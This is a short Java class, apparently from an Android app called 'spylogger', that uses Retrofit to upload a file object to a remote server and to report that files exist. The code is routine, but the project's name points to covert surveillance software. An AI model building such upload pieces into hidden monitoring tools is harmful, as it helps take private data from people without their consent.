package com.gravatasufoca.spylogger.services;

import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;

import retrofit2.Call;

/**
 * Created by bruno on 02/12/16.
 */

public class SendArquivoService extends SendDataService<Boolean> {

    public SendArquivoService(TaskComplete handler) {
        super(handler);
    }

    public void enviar(EnvioArquivoVO envioArquivoVO){
        Call<Boolean> call=sendApi.enviarArquivo(envioArquivoVO);
        call.enqueue(this);
    }
    public void notificarExistencia(EnvioArquivoVO envioArquivoVO){
        Call<Boolean> call=sendApi.notificarExistencia(envioArquivoVO);
        call.enqueue(this);
    }
}
